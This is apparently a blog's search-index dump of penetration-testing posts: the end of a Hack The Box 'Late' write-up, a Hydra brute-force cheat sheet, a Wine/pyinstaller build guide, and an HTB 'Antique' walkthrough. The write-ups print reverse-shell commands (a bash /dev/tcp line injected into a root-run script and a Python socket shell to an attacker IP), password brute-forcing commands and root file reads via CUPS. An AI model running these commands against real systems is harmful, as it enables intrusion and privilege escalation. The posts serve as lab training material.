0.0 0 0 ? I&lt; 18:36 0:00 [ipv6_addrconf]root 105 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [kstrp]root 122 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [charger_manager]root 124 0.0 0.0 0 0 ? I 18:36 0:00 [kworker/0:2]root 173 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_2]root 174 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_2]root 175 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_3]root 176 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_3]root 177 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_4]root 178 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [ttm_swap]root 179 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_4]root 180 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_5]root 181 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_5]root 182 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_6]root 183 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_6]root 184 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_7]root 185 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_7]root 186 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_8]root 187 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_8]root 188 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_9]root 189 0.0 0.0 0 0 ? S 18:36 0:00 [irq/16-vmwgfx]root 190 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_9]root 191 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_10]root 192 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_10]root 193 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_11]root 194 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [mpt_poll_0]root 195 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [mpt/0]root 196 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_11]root 197 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_12]root 198 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_12]root 199 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_13]root 200 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_13]root 201 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_14]root 202 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_14]root 203 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_15]root 204 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_15]root 205 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_16]root 206 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_16]root 207 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_17]root 212 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_17]root 216 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_18]root 221 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_18]root 223 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_19]root 226 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_19]root 231 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_20]root 232 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_20]root 233 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_21]root 248 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_21]root 250 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_22]root 251 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_22]root 253 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_23]root 254 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_23]root 255 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_24]root 256 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_24]root 257 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_25]root 259 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_25]root 260 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_26]root 261 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_26]root 262 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_27]root 263 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_27]root 264 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_28]root 265 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_28]root 266 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_29]root 268 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_29]root 269 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_30]root 270 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_30]root 271 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_31]root 272 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_31]root 310 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_32]root 311 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_32]root 313 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [kworker/1:1H]root 316 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [kworker/0:1H]root 322 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [kdmflush]root 323 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [bioset]root 324 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [kdmflush]root 326 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [bioset]root 403 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [raid5wq]root 460 0.0 0.0 0 0 ? S 18:36 0:00 [jbd2/dm-0-8]root 461 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [ext4-rsv-conver]root 538 0.0 0.5 127716 11080 ? S&lt;s 18:36 0:00 /lib/systemd/systemd-journaldroot 539 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [iscsi_eh]root 545 0.0 0.0 105912 1780 ? Ss 18:36 0:00 /sbin/lvmetad -froot 546 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [ib-comp-wq]root 547 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [ib-comp-unb-wq]root 548 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [ib_mcast]root 549 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [ib_nl_sa_wq]root 553 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [rdma_cm]root 555 0.0 0.0 0 0 ? I 18:36 0:04 [kworker/1:3]root 561 0.0 0.2 46536 5080 ? Ss 18:36 0:01 /lib/systemd/systemd-udevdroot 600 0.0 0.0 0 0 ? S 18:36 0:00 [jbd2/sda2-8]root 601 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [ext4-rsv-conver]systemd+ 615 0.0 0.1 145972 3224 ? Ssl 18:36 0:00 /lib/systemd/systemd-timesyncdroot 698 0.0 0.4 89872 10020 ? Ss 18:36 0:00 /usr/bin/VGAuthServiceroot 701 0.0 0.3 225736 7168 ? S&lt;sl 18:36 0:10 /usr/bin/vmtoolsdsystemd+ 838 0.0 0.2 71732 5060 ? Ss 18:36 0:00 /lib/systemd/systemd-networkdsystemd+ 855 0.0 0.2 70500 4984 ? Ss 18:36 0:00 /lib/systemd/systemd-resolvedroot 1007 0.0 0.0 95548 1560 ? Ssl 18:36 0:00 /usr/bin/lxcfs /var/lib/lxcfs/root 1008 0.0 0.4 434328 9640 ? Ssl 18:36 0:00 /usr/sbin/ModemManager --filter-policy=strictsyslog 1013 0.0 0.2 263044 4336 ? Ssl 18:36 0:00 /usr/sbin/rsyslogd -ndaemon 1016 0.0 0.1 28340 2468 ? Ss 18:36 0:00 /usr/sbin/atd -froot 1028 0.0 0.0 110556 2028 ? Ssl 18:36 0:00 /usr/sbin/irqbalance --foregroundroot 1029 0.0 0.3 286260 6716 ? Ssl 18:36 0:00 /usr/lib/accountsservice/accounts-daemonroot 1030 0.0 0.2 70476 5936 ? Ss 18:36 0:00 /lib/systemd/systemd-logindroot 1036 0.0 0.8 169104 17100 ? Ssl 18:36 0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggersavahi 1037 0.0 0.1 47212 3780 ? Ss 18:36 0:00 avahi-daemon: running [late.local]root 1048 0.0 0.1 30036 3320 ? Ss 18:36 0:00 /usr/sbin/cron -fmessage+ 1050 0.0 0.2 50380 4828 ? Ss 18:36 0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile -avahi 1059 0.0 0.0 47084 340 ? S 18:36 0:00 avahi-daemon: chroot helperroot 1104 0.0 0.7 479236 16032 ? Ssl 18:36 0:01 /usr/sbin/NetworkManager --no-daemonroot 1105 0.0 0.2 45240 5492 ? Ss 18:36 0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicantroot 1164 0.0 0.3 288888 6604 ? Ssl 18:36 0:00 /usr/lib/policykit-1/polkitd --no-debugsvc_acc 1199 0.0 1.1 60704 22828 ? Ss 18:36 0:02 /usr/bin/python3 /usr/local/bin/gunicorn --workers 3 wsgi:approot 1245 0.0 0.0 141720 1576 ? Ss 18:36 0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;www-data 1246 0.0 0.3 144016 7296 ? S 18:36 0:00 nginx: worker processwww-data 1247 0.0 0.3 144016 7296 ? S 18:36 0:01 nginx: worker processroot 1284 0.0 0.3 72308 6548 ? Ss 18:36 0:00 /usr/sbin/sshd -Droot 1297 0.0 0.1 14896 2044 tty1 Ss+ 18:36 0:00 /sbin/agetty -o -p -- \\u --noclear tty1 linuxsvc_acc 1467 0.0 1.8 106596 38396 ? S 18:36 0:04 /usr/bin/python3 /usr/local/bin/gunicorn --workers 3 wsgi:appsvc_acc 1481 0.0 1.7 104864 36496 ? S 18:36 0:04 /usr/bin/python3 /usr/local/bin/gunicorn --workers 3 wsgi:appsvc_acc 1502 0.0 1.7 103740 35328 ? S 18:36 0:03 /usr/bin/python3 /usr/local/bin/gunicorn --workers 3 wsgi:approot 1541 0.0 0.2 124836 5244 ? Ss 18:36 0:00 sendmail: MTA: accepting connectionsroot 2072 0.0 0.0 0 0 ? I 18:51 0:00 [kworker/1:0]root 2865 0.0 0.0 0 0 ? R 19:54 0:00 [kworker/u4:0]root 3281 0.0 0.0 0 0 ? I 20:26 0:00 [kworker/u4:1]svc_acc 4094 0.0 0.0 0 0 ? Z 21:21 0:00 [sh] &lt;defunct&gt;root 4122 0.0 0.3 112148 7400 ? Ss 21:23 0:00 sshd: svc_acc [priv]svc_acc 4127 0.0 0.3 76660 7660 ? Ss 21:23 0:00 /lib/systemd/systemd --usersvc_acc 4128 0.0 0.1 195648 2376 ? S 21:23 0:00 (sd-pam)svc_acc 4147 0.0 0.1 112148 3656 ? R 21:23 0:00 sshd: svc_acc@pts/0svc_acc 4148 0.0 0.2 21472 5276 pts/0 Ss 21:23 0:00 -bashsvc_acc 4378 0.0 0.1 38380 3652 pts/0 R+ 21:35 0:00 ps auxInteresting filesfind / -type f -user svc_acc 2&gt;/dev/null/usr/local/sbin/ssh-alert.shLinpeasIn my system.python3 -m http.server 7890mktemp -dcd /tmp/tmp.RVkAHAuLJKcurl http://&lt;my_ip&gt;:7890/linpeas.sh -o linpeas.shchmod +x linpeas.sh./linpeas.sh &gt; linpeas.outMaintaining accessWe already have the ssh key for the user…InstallationNo need to install anything.Command and ControlNo need to install anything.Privilege escalation / lateral movementsWe can see that the application has internal open ports that are not available to the public. It’s the teseract application converting the images.The other point that we will check is the ssh-alert.sh file.#!/bin/bashRECIPIENT=\"root@late.htb\"SUBJECT=\"Email from Server Login: SSH Alert\"BODY=\"A SSH login was detected. User: $PAM_USER User IP Host: $PAM_RHOST Service: $PAM_SERVICE TTY: $PAM_TTY Date: `date` Server: `uname -a`\"if [ ${PAM_TYPE} = \"open_session\" ]; then echo \"Subject:${SUBJECT} ${BODY}\" | /usr/sbin/sendmail ${RECIPIENT}fiIn order to escalate privileges we just need to include a reverse shell into the bash script and do a ssh login.echo \"bash -i &gt;&amp; /dev/tcp/&lt;my_ip&gt;/4321 0&gt;&amp;1\" &gt;&gt; /usr/local/sbin/ssh-alert.shAnd open the listener.nc -nlvp 4321The user will be root and the flag can be obtained.ExfiltrationMaintaining accessNot needed as we are talking of a HTB machine…Covering tracksNot needed as we are talking of a HTB machine…" }, { "title": "Hydra", "url": "/posts/hydra-attacks/", "categories": "Tools", "tags": "Hydra, SSH, FTP, MySQL, Web", "date": "2022-08-03 15:55:00 +0200", "snippet": "Web formsTo launch password attacks in forms using http-post-form and injecting the variables like ^USER^. The data in the request can be obtained using Chrome dev tools or Burpsuite.hydra -l admin...", "content": "Web formsTo launch password attacks in forms using http-post-form and injecting the variables like ^USER^. The data in the request can be obtained using Chrome dev tools or Burpsuite.hydra -l admin -P /usr/share/jonh/password.lst 10.0.2.6 http-post-form \"/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;login=Login:Login failed\" -fThe options are: -u username -L user list -p password -P passwordList -f exit at the first successful result server, where to attack service t number of threads to run in parallel http-post-form service.Another example with http-gethydra -l admin -P pass.txt $TARGET http-get /webdavSSHWe use the ssh service.hydra -l root -P /usr/share/wordlists/rockyou.txt.gz $TARGET sshFTPhydra -t 4 -l Mike -P /usr/share/wordlists/rockyou.txt -vV $TARGET ftpMySQLhydra -t 4 -l root -P /usr/share/wordlists/rockyou.txt $TARGET mysql" }, { "title": "Building Python for Windows with Wine", "url": "/posts/wine/", "categories": "Linux", "tags": "Wine, Python, pyinstaller, python-pip", "date": "2022-08-03 14:55:00 +0200", "snippet": "Wine is a compatibility layer to run Windows applications in POSIX systems like Linux.One great example is the possibility to create .exe files using Python. Please note that in the recent version...", "content": "Wine is a compatibility layer to run Windows applications in POSIX systems like Linux.One great example is the possibility to create .exe files using Python. Please note that in the recent versions of Windows such as Windows 11, Microsoft is forcing you to sign the .exe files in order to be able to run them.Install wine in your machineIt can be installed with your package manager.sudo apt-get install wineNote that it’s necessary to have x86 arch also enabled, so maybe you have to run this:sudo dpkg --add-architecture i386 &amp;&amp; sudo apt-get update &amp;&amp; sudo apt-get install wine32Install PythonTo install Python you must download the version that you want to run. In this case we are using 2.7sudo wine msiexec /i /home/kali/Downloads/python-2.7.18.msiIt will be installed in /root/.wine/drive_c/Python27Install Pip dependenciesOnce it is installed, you would see that you have the /root/.wine/ folder. Let’s install pip.curl https://bootstrap.pypa.io/get-pip.py -o get-pip.pysudo wine /root/.wine/drive_c/Python27/python.exe get-pip.pysudo wine /root/.wine/drive_c/Python27/python.exe -m pip helpTo install dependencies and use in the executable,sudo wine /root/.wine/drive_c/Python27/python.exe -m pip install &lt;dependency&gt;Build the executableTo compile the executablesudo wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole &lt;python_file.py&gt; Python 2.7 reached end of its life on January 1st, 2020. Please upgrade your Python!!Obfuscate and Windows DefenderIn the recent versions of Windows your .exe file will be identified by Windows Defender. So long I wasn’t able to avoid this using alternative packages to pyinstaller or using obfuscation. Let me know if there is some workaround to signing the files!" }, { "title": "HTB Antique", "url": "/posts/htb-antique/", "categories": "HTB, Easy", "tags": "Network, Easy, Internal, Telnet, CVE-2012-5519, SNMP, HTB, snmpwalk, nmap, CUPS", "date": "2022-08-03 14:55:00 +0200", "snippet": "Reconnaissance/Intelligence GatheringIn this step we collect the target information available in public repositories or sources. We do everything passively.For HTB machines there is not much to do,...", "content": "Reconnaissance/Intelligence GatheringIn this step we collect the target information available in public repositories or sources. We do everything passively.For HTB machines there is not much to do, just check the name to identify possible ideas.Scanning and enumerationNow it’s time to start the active scanning.As always, we define our TARGET and hosts file of our machine to facilitate the process.TARGET=&lt;ip_of_the_machine&gt;sudo nano /etc/hosts # Add a line with the machine IP /t antique.htbWe launch a single TCMP probe to check ping.ping -c 1 $TARGET\t\t# =&gt; Ping is workingNMAPTo scan the target to find open ports and possible vulnerabilities we use nmap.First, simple TCP scan without DNS resolution and ping discovery, to all the ports and with the version detection.nmap -n -Pn -sV -p- $TARGET -vvv -oG allPortsWe discover that we have a Telnet running in port 23.# Nmap 7.92 scan initiated Tue Jul 19 15:25:43 2022 as: nmap -n -Pn -sV -p- -T4 -vvv -oG allPorts antique.htb# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10.10.11.107 () Status: UpHost: 10.10.11.107 () Ports: 23/open/tcp//telnet?/// Ignored State: closed (65534)# Nmap done at Tue Jul 19 15:27:23 2022 -- 1 IP address (1 host up) scanned in 99.79 secondsThen we launch the standard scripts in the ports open but nothing shows.nmap -n -Pn -sVC -p23 $TARGET -oN targetedWe can launch a UDP scan.sudo nmap -n -Pn -sV -sU -p- $TARGET -vvv -oG allPortsUDPWe found port 631 open with a SNMP service running v1.# Nmap 7.92 scan initiated Tue Jul 19 15:35:49 2022 as: nmap -n -Pn -sVC -sU -p161 -vvv -oG allPortsUDP antique.htb# Ports scanned: TCP(0;) UDP(1;161) SCTP(0;) PROTOCOLS(0;)Host: 10.10.11.107 () Status: UpHost: 10.10.11.107 () Ports: 161/open/udp//snmp//SNMPv1 server (public)/# Nmap done at Tue Jul 19 15:35:57 2022 -- 1 IP address (1 host up) scanned in 8.24 secondsTelnetWe try to login but a password is required.Trying 10.10.11.107...Connected to antique.htb.Escape character is '^]'.HP JetDirectPassword:As we can see the machine is HP JetDirect, we launch a searchsploit.searchsploit JetDirectThat shows that we have a possible vulnerability in the SNMP.HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure | hardware/remote/22319.txtSNMPLooking at the file we see that the SNMP server is providing the Telnet password by launching an SNMP GET request sending the string.We launch a simple request with snmpwalk to see if the server is responding.snmpwalk -v 1 -c public 10.10.11.107And the response is correct:iso.3.6.1.2.1 = STRING: \"HTB Printer\"So we launch the special request that we saw in the searchsploit txt considering version 1 and domain public.snmpwalk -v 1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0The response returns the password in HEX that can be converted in plain text using CyberChef.Gaining accessWe use the password to access using Telnet.Trying 10.10.11.107...Connected to antique.htb.Escape character is '^]'.HP JetDirectPassword: P@ssw0rd@123!!123Please type \"?\" for HELP&gt; ?To Change/Configure Parameters Enter:Parameter-name: value &lt;Carriage Return&gt;Parameter-name Type of valueip: IP-address in dotted notationsubnet-mask: address in dotted notation (enter 0 for default)default-gw: address in dotted notation (enter 0 for default)syslog-svr: address in dotted notation (enter 0 for default)idle-timeout: seconds in integersset-cmnty-name: alpha-numeric string (32 chars max)host-name: alpha-numeric string (upper case only, 32 chars max)dhcp-config: 0 to disable, 1 to enableallow: &lt;ip&gt; [mask] (0 to clear, list to display, 10 max)addrawport: &lt;TCP port num&gt; (&lt;TCP port num&gt; 3000-9000)deleterawport: &lt;TCP port num&gt;listrawport: (No parameter required)exec: execute system commands (exec id)exit: quit from telnet sessionInternal reconnaissanceAs we can see from the help message, We are already authenticated in the telnet service and we can execute commands using exec.exec id # uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)So we can obtain the user flag. exec cat user.txtTo work in a comfortable way we will launch a reverse shell. For reference, I like to use Reverse Shell Generatorexec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.13\",7890));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'Once we receive the request we do the treatment as usual.script /dev/null -c bash&gt;&gt;&gt; Ctrl+Zstty raw -echo; fgresetxtermexport TERM=xtermexport SHELL=bashstty columns 54stty rows 136Check important filesIn /etc/passwd we see no users except root with access to a bash or zsh, we can see that the user is a specific user for the printer lpd, with no login.We do some actions Check files in the pwd for the user, /var/spool/lpd, we found the telnet.py script. Check for the processes ps aux Check for the listening ports netstat -tnlpWe see that there is a service listening in the port 631(Not all processes could be identified, non-owned process infowill not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN -tcp 0 0 0.0.0.0:23 0.0.0.0:* LISTEN 1026/python3tcp6 0 0 ::1:631 :::* LISTEN -Usually this process is a CUPS web interface, we can verify by launching a curl request. (If you are running Linux in your machine you might have it also)curl \"http://localhost:631/\"Privilege escalationA possible way to read server files is using the error log from CUPS. Error logs from the CUPS can be accessed using:curl http://localhost:631/admin/log/error_logCUPS runs using root, so it is possible to access root files.The error log is reading the error file and we can verify it using:cupsctlWe just need to update it…cupsctl ErrorLog=\"/root/root.txt\"And then, we launch the curl again to see the flag.Maintaining accessNot needed as we are talking of a HTB machine…Covering tracksNot needed as we are talking of a HTB machine…" } ]
